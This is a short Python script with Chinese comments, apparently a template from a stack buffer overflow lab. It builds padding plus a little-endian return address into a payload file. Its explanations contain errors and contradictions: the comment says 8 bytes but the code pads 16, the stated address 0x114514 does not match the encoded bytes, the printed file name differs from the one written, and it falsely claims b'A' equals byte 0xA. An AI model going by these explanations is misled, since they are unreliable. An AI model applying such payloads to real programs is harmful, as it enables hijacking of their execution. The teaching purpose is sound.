# 比如你发现你可以使用'A'去覆盖8个字节，然后跳转到0x114514地址就可以完成任务，那么你可以这么写你的payload并保存
padding = b"A" * 16
func1_address = b"\x16\x12\x40\x00\x00\x00\x00\x00"  # 小端地址
payload = padding+ func1_address
# Write the payload to a file
with open("ans1.txt", "wb") as f:
    f.write(payload)
print("Payload written to ans.txt")
#解释一下，为什么要将函数地址写成这个样子
#比方说你希望将字节0xA放在栈上时，如果你的txt文件是可见字符'A'的话，实际上放到栈上的是字节0x41(可见字符'A'对应的ASCll码值)
#但很明显，这不符合我们的预期，因此需要用关键字b去保证是0xA，比如b'A'，此时就是0xA，而不是可见字符'A'
#再之后就是地址的问题了，比如地址0x114514,由于大部分人的机器是小端存储，在python中最低有效字节应该放在前面，因此最后结果为上面代码的结果
#当然，如果你不喜欢python的话，可以尝试其他多种写法，只需要保证结果正确就行。